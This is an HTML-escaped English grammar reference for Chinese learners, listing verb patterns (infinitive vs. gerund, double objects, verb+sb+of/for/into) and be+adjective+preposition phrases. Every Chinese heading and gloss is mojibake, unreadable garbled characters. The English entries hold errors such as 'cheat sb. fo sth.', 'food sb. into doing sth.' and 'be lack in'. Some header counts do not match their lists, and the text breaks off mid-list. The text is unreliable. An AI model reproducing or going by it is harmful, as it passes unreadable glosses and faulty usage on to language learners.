&lt;p&gt;å¯ŸæŸäººåšæŸäº‹&lt;/p&gt;
&lt;h2 id=&#34;æ¥ä¸å®šå¼æˆ–åŠ¨åè¯ä½œå®¾è¯­æ„æ€ç›¸åŒçš„12ä¸ªåŠ¨è¯&#34;&gt;æ¥ä¸å®šå¼æˆ–åŠ¨åè¯ä½œå®¾è¯­æ„æ€ç›¸åŒçš„12ä¸ªåŠ¨è¯&lt;/h2&gt;
&lt;p&gt;like to do sth / like doing sth. å–œæ¬¢åšæŸäº‹&lt;/p&gt;
&lt;p&gt;love to do sth / love doing sth. å–œæ¬¢åšæŸäº‹&lt;/p&gt;
&lt;p&gt;hate to do sth / hate doing sth. æ†æ¨åšæŸäº‹&lt;/p&gt;
&lt;p&gt;prefer to do sth / prefer doing sth. å®å¯åšæŸäº‹&lt;/p&gt;
&lt;p&gt;begin to do sth / begin doing sth. å¼€å§‹åšæŸäº‹&lt;/p&gt;
&lt;p&gt;start to do sth / start doing sth. å¼€å§‹åšæŸäº‹&lt;/p&gt;
&lt;p&gt;continue to do sth / continue doing sth. ç»§ç»­åšæŸäº‹&lt;/p&gt;
&lt;p&gt;canâ€™t bear to do sth / canâ€™t bear doing sth. ä¸èƒ½å¿å—åšæŸäº‹&lt;/p&gt;
&lt;p&gt;bother to do sth / bother doing sth. éº»çƒ¦åšæŸäº‹&lt;/p&gt;
&lt;p&gt;intend to do sth / intend doing sth.æƒ³è¦åšæŸäº‹&lt;/p&gt;
&lt;p&gt;attempt to do sth / attempt doing sth. è¯•å›¾åšæŸäº‹&lt;/p&gt;
&lt;p&gt;cease to do sth / cease doing sth. åœæ­¢åšæŸäº‹&lt;/p&gt;
&lt;h2 id=&#34;æ¥ä¸å®šå¼æˆ–åŠ¨åè¯ä½œå®¾è¯­æ„æ€ä¸åŒçš„7ä¸ªåŠ¨è¯&#34;&gt;æ¥ä¸å®šå¼æˆ–åŠ¨åè¯ä½œå®¾è¯­æ„æ€ä¸åŒçš„7ä¸ªåŠ¨è¯&lt;/h2&gt;
&lt;p&gt;(1) remember to do sth. è®°ä½è¦åšæŸäº‹                        remember doing sth. è®°ä½æ›¾åšè¿‡æŸäº‹&lt;/p&gt;
&lt;p&gt;(2) forget to do sth. å¿˜è®°è¦åšæŸäº‹                         forget doing sth. å¿˜è®°æ›¾åšè¿‡æŸäº‹&lt;/p&gt;
&lt;p&gt;(3) regret to do sth. åæ‚”ï¼ˆé—æ†¾ï¼‰è¦åšæŸäº‹         regret doing sth. åæ‚”ï¼ˆé—æ†¾ï¼‰æ›¾åšè¿‡æŸäº‹&lt;/p&gt;
&lt;p&gt;(4) try to do sth. è®¾æ³•è¦åšæŸäº‹                                try doing sth. åšæŸäº‹è¯•è¯•çœ‹æœ‰ä½•æ•ˆæœ&lt;/p&gt;
&lt;p&gt;(5) mean to do sth. æ‰“ç®—åšæŸäº‹                                mean doing sth. æ„å‘³ç€åšæŸäº‹&lt;/p&gt;
&lt;p&gt;(6) canâ€™t help to do sth. ä¸èƒ½å¸®åŠ©åšæŸäº‹                 canâ€™t help doing sth. ç¦ä¸ä½åšæŸäº‹&lt;/p&gt;
&lt;p&gt;(7) go on to do sth. åšå®ŒæŸäº‹åæ¥ç€åšå¦ä¸€äº‹         go on doing sth. ç»§ç»­åšä¸€ç›´åœ¨åšçš„äº‹&lt;/p&gt;
&lt;p&gt;æ³¨ï¼šstop to do sth. ä¸stop doing sth.ä¹Ÿä¸åŒï¼Œå‰è€…æŒ‡åœä¸‹æ¥å»åšæŸäº‹ï¼Œåè€…æŒ‡åœæ­¢æ­£åœ¨åšçš„äº‹ï¼Œä½†stop to do sth. ä¸­çš„ä¸å®šå¼ä¸æ˜¯å®¾è¯­ï¼Œæ˜¯ç›®çš„çŠ¶è¯­ã€‚&lt;/p&gt;
&lt;h2 id=&#34;å¯æ¥åŒå®¾è¯­çš„38ä¸ªå¸¸ç”¨åŠ¨è¯&#34;&gt;å¯æ¥åŒå®¾è¯­çš„38ä¸ªå¸¸ç”¨åŠ¨è¯&lt;/h2&gt;
&lt;p&gt;(1) åŒå®¾è¯­æ˜“ä½æ—¶éœ€å€ŸåŠ©ä»‹è¯toçš„å¸¸ç”¨åŠ¨è¯&lt;/p&gt;
&lt;p&gt;award sb. sth. = award sth. to sb. é¢å¥–ç»™æŸäºº&lt;/p&gt;
&lt;p&gt;bring sb. sth. = bring sth. to sb. æŠŠæŸç‰©å¸¦ç»™æŸäºº&lt;/p&gt;
&lt;p&gt;hand sb. sth. =hand sth. to sb. æŠŠæŸç‰©é€’ç»™æŸäºº&lt;/p&gt;
&lt;p&gt;lend sb. sth. = lend sth. to sb. æŠŠæŸç‰©å€Ÿç»™æŸäºº&lt;/p&gt;
&lt;p&gt;mail sb. sth. = mail sth. to sb. æŠŠæŸç‰©å¯„ç»™æŸäºº&lt;/p&gt;
&lt;p&gt;offer sb. sth. = offer sth. to sb. å°†æŸç‰©ç»™æŸäºº&lt;/p&gt;
&lt;p&gt;owe sb. sth. = owe sth. to sb. æ¬ æŸäººæŸç‰©&lt;/p&gt;
&lt;p&gt;pass sb. sth. = pass sth. to sb. æŠŠæŸç‰©é€’ç»™æŸäºº&lt;/p&gt;
&lt;p&gt;pay sb. sth. = pay sth. to sb. ä»˜ç»™æŸäººæŸç‰©ï¼ˆé’±ï¼‰&lt;/p&gt;
&lt;p&gt;post sb. sth. = post sth. to sb. æŠŠæŸç‰©å¯„ç»™æŸäºº&lt;/p&gt;
&lt;p&gt;read sb. sth. = read sth. to sb. æŠŠæŸç‰©è¯»ç»™æŸäººå¬&lt;/p&gt;
&lt;p&gt;return sb. sth. = return sth. to sb. æŠŠæŸç‰©è¿˜ç»™æŸäºº&lt;/p&gt;
&lt;p&gt;send sb. sth. = send sth. to sb. æŠŠæŸç‰©é€ç»™æŸäºº&lt;/p&gt;
&lt;p&gt;sell sb. sth. = sell sth. to sb. æŠŠæŸç‰©å–ç»™æŸäºº&lt;/p&gt;
&lt;p&gt;serve sb. sth. = serve sth. to sb. æ‹¿æŸç‰©æ‹›å¾…æŸäºº&lt;/p&gt;
&lt;p&gt;show sb. sth. = show sth. to sb. æ‹¿æŸç‰©ç»™æŸäººçœ‹&lt;/p&gt;
&lt;p&gt;take sb. sth. = take sth. to sb. æŠŠæŸç‰©æ‹¿ç»™æŸäºº&lt;/p&gt;
&lt;p&gt;teach sb. sth. = teach sth. to sb. æ•™æŸäººæŸç‰©&lt;/p&gt;
&lt;p&gt;tell sb. sth. = tell sth. to sb. å‘Šè¯‰æŸäººæŸæƒ…å†µ&lt;/p&gt;
&lt;p&gt;throw sb. sth. = throw sth. to sb. æŠŠæŸç‰©æ‰”ç»™æŸäºº&lt;/p&gt;
&lt;p&gt;write sb. sth. = write sth. to sb. ç»™æŸäººå†™ä¿¡&lt;/p&gt;
&lt;p&gt;(2) åŒå®¾è¯­æ˜“ä½æ—¶éœ€å€ŸåŠ©ä»‹è¯forçš„å¸¸ç”¨åŠ¨è¯&lt;/p&gt;
&lt;p&gt;book sb. sth. = book sth. for sb. ä¸ºæŸäººé¢„å®šæŸç‰©&lt;/p&gt;
&lt;p&gt;buy sb. sth. = buy sth. for sb. ä¸ºæŸäººä¹°æŸç‰©&lt;/p&gt;
&lt;p&gt;choose sb. sth. = choose sth. for sb. ä¸ºæŸäººé€‰æŸç‰©&lt;/p&gt;
&lt;p&gt;cook sb. sth. = cook sth. for sb. ä¸ºæŸäººç…®æŸç‰©&lt;/p&gt;
&lt;p&gt;draw sb. sth. = draw sth. for sb. ä¸ºæŸäººç”»æŸç‰©&lt;/p&gt;
&lt;p&gt;fetch sb. sth. = fetch sth. for sb. ä¸ºæŸäººå»å–æŸç‰©&lt;/p&gt;
&lt;p&gt;find sb. sth. = find sth. for sb. ä¸ºæŸäººæ‰¾åˆ°æŸç‰©&lt;/p&gt;
&lt;p&gt;fix sb. sth. = fix sth. for sb. ä¸ºæŸäººå‡†å¤‡æŸç‰©&lt;/p&gt;
&lt;p&gt;get sb. sth. = get sth. for sb. ä¸ºæŸäººæ‹¿æ¥æŸç‰©&lt;/p&gt;
&lt;p&gt;make sb. sth. = make sth. for sb. ä¸ºæŸäººåšæŸç‰©&lt;/p&gt;
&lt;p&gt;order sb. sth. = order sth. for sb. ä¸ºæŸäººè®¢è´­æŸç‰©&lt;/p&gt;
&lt;p&gt;pick sb. sth. = pick sth. for sb. ä¸ºæŸäººé‡‡æ‘˜æŸç‰©&lt;/p&gt;
&lt;p&gt;prepare sb. sth. = prepare sth. for sb. ä¸ºæŸäººå‡†å¤‡æŸç‰©&lt;/p&gt;
&lt;p&gt;save sb. sth. = save sth. for sb. ä¸ºæŸäººç•™æŸç‰©&lt;/p&gt;
&lt;p&gt;sing sb. sth. = sing sth. for sb. ä¸ºæŸäººå”±æŸç‰©ï¼ˆæ­Œï¼‰&lt;/p&gt;
&lt;p&gt;spare sb. sth. = spare sth. for sb. ä¸ºæŸäººè®©å‡ºæŸç‰©&lt;/p&gt;
&lt;p&gt;steal sb. sth. = steal sth. for sb. ä¸ºæŸäººå·æŸç‰©&lt;/p&gt;
&lt;p&gt;æ³¨ï¼šæœ‰çš„åŠ¨è¯åæ¥çš„åŒå®¾è¯­æ˜“ä½æ—¶ï¼Œæ—¢å¯ç”¨ä»‹è¯toå¼•å‡ºé—´æ¥å®¾è¯­ï¼Œä¹Ÿå¯ç”¨ä»‹è¯forå¼•å‡ºé—´æ¥å®¾è¯­ï¼Œå«ä¹‰ç›¸åŒï¼Œå¦‚bringï¼Œplayç­‰ï¼š&lt;/p&gt;
&lt;p&gt;Bring me todayâ€™s paper. = Bring todayâ€™s paper to [for] me. æŠŠä»Šå¤©çš„æŠ¥çº¸æ‹¿ç»™æˆ‘ã€‚&lt;/p&gt;
&lt;p&gt;He played us the record he had just bought. = He played the record he had just bought for [to] us. ä»–æ”¾äº†ä»–
åˆšä¹°çš„å”±ç‰‡ç»™æˆ‘ä»¬å¬ã€‚&lt;/p&gt;
&lt;p&gt;æœ‰çš„åŠ¨è¯åæ¥çš„åŒå®¾è¯­æ˜“ä½æ—¶ï¼Œå³å¯ç”¨ä»‹è¯toå¼•å‡ºé—´æ¥å®¾è¯­ï¼Œä¹Ÿå¯ç”¨ä»‹è¯forå¼•å‡ºé—´æ¥å®¾è¯­ï¼Œå«ä¹‰ä¸åŒï¼Œå¦‚leaveç­‰ï¼š&lt;/p&gt;
&lt;p&gt;They left me no food. = They left no food for me. ä»–ä»¬æ²¡ç»™æˆ‘ç•™ä¸€ç‚¹é£Ÿç‰©ã€‚&lt;/p&gt;
&lt;p&gt;My uncle left me a large fortune. = My uncle left a large fortune to me.&lt;/p&gt;
&lt;p&gt;æˆ‘å”å”æ­»åç•™ä¸‹ä¸€å¤§ç¬”è´¢äº§ç»™æˆ‘ã€‚&lt;/p&gt;
&lt;p&gt;è€Œæœ‰çš„åŠ¨è¯åæ¥åŒå®¾è¯­æ—¶ï¼Œæ—¢ä¸èƒ½ç”¨ä»‹è¯toå¼•å‡ºé—´æ¥å®¾è¯­ï¼Œä¹Ÿä¸èƒ½ç”¨ä»‹è¯forå¼•å‡ºé—´æ¥å®¾è¯­ï¼Œå¦‚allow, ask, cause, charge, cost,
forgive, refuseç­‰ï¼š&lt;/p&gt;
&lt;p&gt;He allows his son too much money. ä»–ç»™ä»–å„¿å­çš„é’±å¤ªå¤šã€‚&lt;/p&gt;
&lt;p&gt;He asked me some questions. ä»–é—®äº†æˆ‘ä¸€äº›é—®é¢˜ã€‚&lt;/p&gt;
&lt;p&gt;This caused me much trouble. ç€ç»™æˆ‘å¸¦æ¥äº†è®¸å¤šéº»çƒ¦ã€‚&lt;/p&gt;
&lt;p&gt;He charged me five dollars for a cup of tea. ä»–ä¸€æ¯èŒ¶å‘æˆ‘è¦äº†5ç¾å…ƒã€‚&lt;/p&gt;
&lt;p&gt;His mistake cost him his job. ä»–çš„é”™è¯¯è®©ä»–ä¸¢äº†å·¥ä½œã€‚&lt;/p&gt;
&lt;p&gt;I envy you your good luck. æˆ‘ç¾¡æ…•ä½ çš„å¥½è¿ã€‚&lt;/p&gt;
&lt;p&gt;They forgave him his rudeness. ä»–ä»¬åŸè°…äº†ä»–çš„é²è½ã€‚&lt;/p&gt;
&lt;p&gt;He refused her nothing. å¥¹è¦ä»€ä¹ˆå°±ç»™ä»€ä¹ˆã€‚&lt;/p&gt;
&lt;h2 id=&#34;å¯ç”¨äºåŠ¨è¯sbof-sthçš„8ä¸ªå¸¸è§åŠ¨è¯&#34;&gt;å¯ç”¨äºâ€œåŠ¨è¯+sb+of sthâ€çš„8ä¸ªå¸¸è§åŠ¨è¯&lt;/h2&gt;
&lt;p&gt;accuse sb. of sth. æ§å‘ŠæŸäººçŠ¯æŸäº‹ï¼ˆç½ªï¼‰ï¼ŒæŒ‡è´£æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;cheat sb. fo sth. éª—å–æŸäººæŸç‰©&lt;/p&gt;
&lt;p&gt;cure sb. of sth. æ²»å¥½æŸäººçš„ç—…ï¼Œæ”¹æ‰æŸäººçš„åä¹ æƒ¯&lt;/p&gt;
&lt;p&gt;inform sb. of sth. é€šçŸ¥æŸäººæŸæƒ…å†µï¼ˆäº‹ï¼‰&lt;/p&gt;
&lt;p&gt;remind sb. of sth. ä½¿æŸäººæƒ³èµ·æŸæƒ…å†µï¼ˆäº‹ï¼‰&lt;/p&gt;
&lt;p&gt;rid sb. of sth. ä½¿æŸäººæ‘†è„±æŸç‰©&lt;/p&gt;
&lt;p&gt;rob sb. of sth. æŠ¢åŠ«æŸäººçš„æŸä¸œè¥¿&lt;/p&gt;
&lt;p&gt;warn sb. of sth. è­¦å‘ŠæŸäººæœ‰æŸæƒ…å†µ&lt;/p&gt;
&lt;h2 id=&#34;å¯ç”¨äºåŠ¨è¯sbfor-doing-sthçš„8ä¸ªå¸¸è§åŠ¨è¯&#34;&gt;å¯ç”¨äºâ€œåŠ¨è¯+sb+for doing sthâ€çš„8ä¸ªå¸¸è§åŠ¨è¯&lt;/h2&gt;
&lt;p&gt;blame sb. for doing sth. æŒ‡è´£æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;criticize sb. for doing sth. æ‰¹è¯„æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;forgive sb. for doing sth. åŸè°…æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;excuse sb. for doing sth. åŸè°…æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;pardon sb. for doing sth. åŸè°…æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;punish sb. for doing sth. æƒ©ç½šæŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;scold sb. for doing sth. æŒ‡è´£ï¼ˆè´£å¤‡ï¼‰æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;thank sb. for doing sth. æ„Ÿè°¢æŸäººåšæŸäº‹&lt;/p&gt;
&lt;h2 id=&#34;å¯ç”¨äºåŠ¨è¯sbinto-doing-sthçš„9ä¸ªå¸¸è§åŠ¨è¯&#34;&gt;å¯ç”¨äºâ€œåŠ¨è¯+sb+into doing sthâ€çš„9ä¸ªå¸¸è§åŠ¨è¯&lt;/h2&gt;
&lt;p&gt;cheat sb. into doing sth. æ¬ºéª—æŸäººåšæŸäº‹                trick sb. into doing sth. æ¬ºéª—æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;food sb. into doing sth. æ¬ºéª—æŸäººåšæŸäº‹                force sb. into doing sth. è¿«ä½¿æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;argue sb. into doing sth. è¯´æœæŸäººåšæŸäº‹                talk sb. into doing sth. è¯´æœæŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;terrify sb. into doing sth. å¨èƒæŸäººåšæŸäº‹                frighten sb. into doing sth. å“å”¬æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;persuade sb. into doing sth. è¯´æœæŸäººåšæŸäº‹&lt;/p&gt;
&lt;h2 id=&#34;å®¹æ˜“è¯¯ç”¨ä½œåŠç‰©åŠ¨è¯çš„9ä¸ªä¸åŠç‰©åŠ¨è¯&#34;&gt;å®¹æ˜“è¯¯ç”¨ä½œåŠç‰©åŠ¨è¯çš„9ä¸ªä¸åŠç‰©åŠ¨è¯&lt;/h2&gt;
&lt;p&gt;è¯¯ï¼šdeal a problem                             æ­£ï¼šdeal with a problem å¤„ç†é—®é¢˜&lt;/p&gt;
&lt;p&gt;è¯¯ï¼šdepend sb.                                   æ­£ï¼šdepend on sb. ä¾é ï¼ˆä¾èµ–ï¼‰æŸäºº&lt;/p&gt;
&lt;p&gt;è¯¯ï¼šinsist doing sth.                           æ­£ï¼šinsist on doing sth. åšæŒè¦åšæŸäº‹&lt;/p&gt;
&lt;p&gt;è¯¯ï¼šknock the door                             æ­£ï¼šknock on [at] the door æ•²é—¨&lt;/p&gt;
&lt;p&gt;è¯¯ï¼šoperate sb.                              æ­£ï¼šoperate on sb. ä¸ºæŸäººåšæ‰‹æœ¯&lt;/p&gt;
&lt;p&gt;è¯¯ï¼šparticipate sth.                          æ­£ï¼šparticipate in sth. å‚åŠ æŸäº‹&lt;/p&gt;
&lt;p&gt;è¯¯ï¼šrefer sth.                                 æ­£ï¼šrefer to sth. æŸ¥é˜…ï¼ˆå‚è€ƒ)æŸç‰©&lt;/p&gt;
&lt;p&gt;è¯¯ï¼šrely sb. / sth.                            æ­£ï¼šrely on sb. / sth. ä¾é ï¼ˆä¾èµ–ï¼‰æŸäººï¼ˆæŸç‰©&lt;/p&gt;
&lt;p&gt;è¯¯ï¼šreply a letter                             æ­£ï¼šreply to a letter å›ä¿¡&lt;/p&gt;
&lt;p&gt;æ³¨ï¼šåœ¨æŸäº›å…¶ä»–ç”¨æ³•ä¸­ï¼Œä»¥ä¸Šæœ‰çš„åŠ¨è¯ä¹Ÿå¯èƒ½åŠç‰©ï¼Œå¦‚insist, replyç­‰åŠ¨è¯åå¯æ¥å®¾è¯­ä»å¥ï¼Œoperateè¡¨ç¤ºâ€œæ“ä½œâ€ã€â€œç®¡ç†â€ç­‰æ—¶åˆ™åŠç‰©ã€‚&lt;/p&gt;
&lt;h2 id=&#34;å®¹æ˜“è¯¯ç”¨ä½œä¸åŠç‰©åŠ¨è¯çš„8ä¸ªåŠç‰©åŠ¨è¯&#34;&gt;å®¹æ˜“è¯¯ç”¨ä½œä¸åŠç‰©åŠ¨è¯çš„8ä¸ªåŠç‰©åŠ¨è¯&lt;/h2&gt;
&lt;p&gt;è¯¯ï¼šserve for sb.                 æ­£ï¼šserve sb. ä¸ºæŸäººæœåŠ¡&lt;/p&gt;
&lt;p&gt;è¯¯ï¼šmarry with sb.              æ­£ï¼šmarry sb. ä¸æŸäººç»“å©š&lt;/p&gt;
&lt;p&gt;è¯¯ï¼šdiscuss about sth.          æ­£ï¼šdiscuss sth. è®¨è®ºæŸäº‹&lt;/p&gt;
&lt;p&gt;è¯¯ï¼šmention about sth.         æ­£ï¼šmention sth. æåˆ°æŸäº‹&lt;/p&gt;
&lt;p&gt;è¯¯ï¼šenter into a room           æ­£ï¼šenter a room è¿›å…¥æˆ¿é—´&lt;/p&gt;
&lt;p&gt;è¯¯ï¼šcontact with sb.             æ­£ï¼šcontact sb. ä¸æŸäººè”ç³»&lt;/p&gt;
&lt;p&gt;è¯¯ï¼šequal to sth.                  æ­£ï¼š equal sth. ç­‰äºæŸç‰©&lt;/p&gt;
&lt;p&gt;è¯¯ï¼šring to sb.                    æ­£ï¼šring sb. ç»™æŸäººæ‰“ç”µè¯&lt;/p&gt;
&lt;p&gt;æ³¨ï¼šæœ‰ä¸ªåˆ«è¯åœ¨ç”¨äºå…¶ä»–æ„ä¹‰æ—¶ï¼Œå¯ä»¥æ˜¯ä¸åŠç‰©çš„ï¼Œå¦‚enter intoå¯ä»¥è¡¨ç¤ºå¼€å§‹è¿›å…¥æˆ–ä»äº‹æŸä¸€çŠ¶æ€æˆ–æ´»åŠ¨ï¼Œæˆ–ç”¨äºè¾ƒæŠ½è±¡çš„æ¦‚å¿µã€‚å¦‚ï¼š&lt;/p&gt;
&lt;p&gt;The country entered into a state of war. è¿™ä¸ªå›½å®¶è¿›å…¥æˆ˜äº‰çŠ¶æ€ã€‚&lt;/p&gt;
&lt;p&gt;I can enter into your feelings at the loss of your father. æˆ‘ç†è§£ä½ å¤±å»çˆ¶äº²åçš„å¿ƒæƒ…ã€‚&lt;/p&gt;
&lt;p&gt;The two old men entered into a long conversation. ä¸¤ä½è€äººå¼€å§‹é•¿è°ˆèµ·æ¥ã€‚&lt;/p&gt;
&lt;h2 id=&#34;17ä¸ªå¸¸ç”¨beå½¢å®¹è¯aboutç»“æ„&#34;&gt;17ä¸ªå¸¸ç”¨â€œbe+å½¢å®¹è¯+aboutâ€ç»“æ„&lt;/h2&gt;
&lt;p&gt;be angry about ä¸ºâ€¦â€¦ç”Ÿæ°”                        be anxious about ä¸ºâ€¦â€¦æ‹…å¿§&lt;/p&gt;
&lt;p&gt;be careful about å½“å¿ƒâ€¦â€¦                         be certain about ç¡®ä¿¡â€¦â€¦&lt;/p&gt;
&lt;p&gt;be curious about å¯¹â€¦â€¦å¥½å¥‡                      be disappointed about å¯¹â€¦â€¦å¤±æœ›&lt;/p&gt;
&lt;p&gt;be excited about å¯¹â€¦â€¦æ„Ÿåˆ°å…´å¥‹                 be glad about å¯¹â€¦â€¦æ„Ÿåˆ°é«˜å…´&lt;/p&gt;
&lt;p&gt;be happy about ä¸ºâ€¦â€¦æ„Ÿåˆ°é«˜å…´                   be hopeful about å¯¹â€¦â€¦æŠ±æœ‰å¸Œæœ›&lt;/p&gt;
&lt;p&gt;be mad about å¯¹â€¦â€¦å…¥è¿·                          be nervous about ä¸ºâ€¦â€¦æ„Ÿåˆ°ä¸å®‰&lt;/p&gt;
&lt;p&gt;be particular about å¯¹â€¦â€¦è®²ç©¶                    be sad about ä¸ºâ€¦â€¦è€Œéš¾è¿‡&lt;/p&gt;
&lt;p&gt;be serious about å¯¹â€¦â€¦è®¤çœŸ                      be sure about å¯¹â€¦â€¦æœ‰æŠŠæ¡&lt;/p&gt;
&lt;p&gt;be worried about ä¸ºâ€¦â€¦æ‹…å¿§&lt;/p&gt;
&lt;h2 id=&#34;10ä¸ªå¸¸ç”¨beå½¢å®¹è¯atç»“æ„&#34;&gt;10ä¸ªå¸¸ç”¨â€œbe+å½¢å®¹è¯+atâ€ç»“æ„&lt;/h2&gt;
&lt;p&gt;be angry at ä¸ºâ€¦â€¦ç”Ÿæ°”                             be bad at ä¸å–„äºâ€¦â€¦&lt;/p&gt;
&lt;p&gt;be clever at æ“…é•¿äºâ€¦â€¦                            be disappointed at å¯¹â€¦â€¦å¤±æœ›&lt;/p&gt;
&lt;p&gt;be expert at åœ¨â€¦â€¦æ–¹é¢æ˜¯å†…è¡Œ                    be good at å–„äºâ€¦â€¦&lt;/p&gt;
&lt;p&gt;be mad at å¯¹â€¦â€¦å‘æ€’                              be quick at åœ¨â€¦â€¦æ–¹é¢æ•æ·&lt;/p&gt;
&lt;p&gt;be skilful at åœ¨â€¦â€¦æ–¹é¢ç†Ÿç»ƒ                        be slow at åœ¨â€¦â€¦æ–¹é¢è¿Ÿé’&lt;/p&gt;
&lt;h2 id=&#34;18ä¸ªå¸¸ç”¨beå½¢å®¹è¯forç»“æ„&#34;&gt;18ä¸ªå¸¸ç”¨â€œbe+å½¢å®¹è¯+forâ€ç»“æ„&lt;/h2&gt;
&lt;p&gt;be anxious for æ¸´æœ›                           be bad for å¯¹â€¦â€¦æœ‰å®³ï¼Œå¯¹â€¦â€¦ä¸åˆ©&lt;/p&gt;
&lt;p&gt;be bound for å‰å¾€                             be celebrated for ä»¥â€¦â€¦å‡ºå&lt;/p&gt;
&lt;p&gt;be convenient for å¯¹â€¦â€¦æ–¹ä¾¿ï¼Œåœ¨â€¦â€¦é™„è¿‘   be eager foræ¸´æœ›&lt;/p&gt;
&lt;p&gt;be famous for å› â€¦â€¦é—»å                      be fit for åˆé€‚ï¼Œé€‚åˆ&lt;/p&gt;
&lt;p&gt;be good for å¯¹â€¦â€¦æœ‰ç›Šï¼ˆæ–¹ä¾¿ï¼‰               be grateful for æ„Ÿè°¢&lt;/p&gt;
&lt;p&gt;be hungry for æ¸´æœ›å¾—åˆ°                        be late for è¿Ÿåˆ°&lt;/p&gt;
&lt;p&gt;be necessary for å¯¹â€¦â€¦æœ‰å¿…è¦                be ready for ä¸ºâ€¦â€¦å‡†å¤‡å¥½&lt;/p&gt;
&lt;p&gt;be sorry for å› â€¦â€¦æŠ±æ­‰                         be suitable for å¯¹â€¦â€¦åˆé€‚ï¼ˆé€‚å®œï¼‰&lt;/p&gt;
&lt;p&gt;be thankful for å› â€¦â€¦è€Œæ„Ÿæ¿€                   be well-known forä»¥â€¦â€¦å‡ºå&lt;/p&gt;
&lt;h2 id=&#34;6ä¸ªå¸¸ç”¨beå½¢å®¹è¯fromç»“æ„&#34;&gt;6ä¸ªå¸¸ç”¨â€œbe+å½¢å®¹è¯+fromâ€ç»“æ„&lt;/h2&gt;
&lt;p&gt;be absent from ç¼ºå¸­ï¼Œä¸åœ¨                   be different from ä¸â€¦â€¦ä¸åŒ&lt;/p&gt;
&lt;p&gt;be far from ç¦»â€¦â€¦è¿œï¼Œè¿œè¿œä¸                  be free from æ²¡æœ‰ï¼Œå…å—&lt;/p&gt;
&lt;p&gt;be safe from æ²¡æœ‰â€¦â€¦çš„å±é™©                  be tired from å› â€¦â€¦è€Œç–²åŠ³&lt;/p&gt;
&lt;h2 id=&#34;13ä¸ªå¸¸ç”¨beå½¢å®¹è¯inç»“æ„&#34;&gt;13ä¸ªå¸¸ç”¨â€œbe+å½¢å®¹è¯+inâ€ç»“æ„&lt;/h2&gt;
&lt;p&gt;be concerned in ä¸â€¦â€¦æœ‰å…³                    be disappointed in å¯¹ï¼ˆæŸäººï¼‰æ„Ÿåˆ°å¤±æœ›&lt;/p&gt;
&lt;p&gt;be engaged in ä»äº‹äºï¼Œå¿™äº                  be experienced in åœ¨â€¦â€¦æ–¹é¢æœ‰ç»éªŒ&lt;/p&gt;
&lt;p&gt;be expert in åœ¨â€¦â€¦æ–¹é¢æ˜¯è¡Œå®¶                 be fortunate in åœ¨â€¦â€¦æ–¹é¢å¹¸è¿&lt;/p&gt;
&lt;p&gt;be honest in åœ¨â€¦â€¦æ–¹é¢è¯šå®                   be interested in å¯¹â€¦â€¦æ„Ÿå…´è¶£&lt;/p&gt;
&lt;p&gt;be lack in ç¼ºä¹                                  be rich in å¯Œäºï¼Œåœ¨â€¦â€¦æ–¹é¢å¯Œæœ‰&lt;/p&gt;
&lt;p&gt;be skilful in æ“…é•¿äº                             be successful in åœ¨â€¦â€¦æ–¹é¢æˆåŠŸ&lt;/p&gt;
&lt;p&gt;be weak in åœ¨â€¦â€¦æ–¹é¢ä¸è¡Œ&lt;/p&gt;
&lt;h2 id=&#34;18ä¸ªå¸¸ç”¨beå½¢å®¹è¯ofç»“æ„&#34;&gt;18ä¸ªå¸¸ç”¨â€œbe+å½¢å®¹è¯+ofâ€ç»“æ„&lt;/h2&gt;
&lt;p&gt;be afraid of å®³æ€•                                 be ashamed of ä¸ºâ€¦â€¦æ„Ÿåˆ°ç¾æ„§&lt;/p&gt;
&lt;p&gt;be aware of æ„è¯†åˆ°ï¼ŒçŸ¥é“                       be capable of èƒ½å¤Ÿï¼Œå¯ä»¥&lt;/p&gt;
&lt;p&gt;be careful of å°å¿ƒï¼Œç•™å¿ƒ                         be certain of ç¡®ä¿¡ï¼Œå¯¹â€¦â€¦æœ‰æŠŠæ¡&lt;/p&gt;
&lt;p&gt;be fond of å–œæ¬¢                                    be free of æ²¡æœ‰ï¼Œæ‘†è„±&lt;/p&gt;
&lt;p&gt;be full of å……æ»¡                                      be glad of ä¸ºâ€¦â€¦è€Œé«˜å…´&lt;/p&gt;
&lt;p&gt;be nervous of å®³æ€•                                be proud of ä¸ºâ€¦â€¦è‡ªè±ª&lt;/p&gt;
&lt;p&gt;be short of ç¼ºä¹                                   be shy of ä¸å¥½æ„æ€&lt;/p&gt;
&lt;p&gt;be sick of å¯¹â€¦â€¦åŒå€¦                              be sure of è‚¯å®šï¼Œæœ‰æŠŠæ¡&lt;/p&gt;
&lt;p&gt;be tired of å¯¹â€¦â€¦åŒçƒ¦                              be worthy of åªå¾—ï¼Œé…å¾—ä¸Š&lt;/p&gt;
&lt;h2 id=&#34;20ä¸ªå¸¸ç”¨beå½¢å®¹è¯toç»“æ„&#34;&gt;20ä¸ªå¸¸ç”¨â€œbe+å½¢å®¹è¯+toâ€ç»“æ„&lt;/h2&gt;
&lt;p&gt;be accustomed to ä¹ æƒ¯äº                       be blind to å¯¹â€¦â€¦è§†è€Œä¸è§&lt;/p&gt;
&lt;p&gt;be close to é è¿‘ï¼Œæ¥è¿‘                           be cruel to å¯¹â€¦â€¦æ®‹é…·ï¼Œå¯¹â€¦â€¦æ— æƒ…&lt;/p&gt;
&lt;p&gt;be devoted to çŒ®èº«ï¼Œä¸“å¿ƒäº                    be equal to ç­‰äºï¼Œèƒ½èƒœä»»&lt;/p&gt;
&lt;p&gt;be familiar to ä¸ºï¼ˆæŸäººï¼‰æ‰€ç†Ÿæ‚‰                be harmful to å¯¹â€¦â€¦æœ‰å±å®³&lt;/p&gt;
&lt;p&gt;be important to å¯¹â€¦â€¦é‡è¦p;                  be open to å¯¹â€¦â€¦å¼€æ”¾ï¼Œæ˜“å—åˆ°&lt;/p&gt;
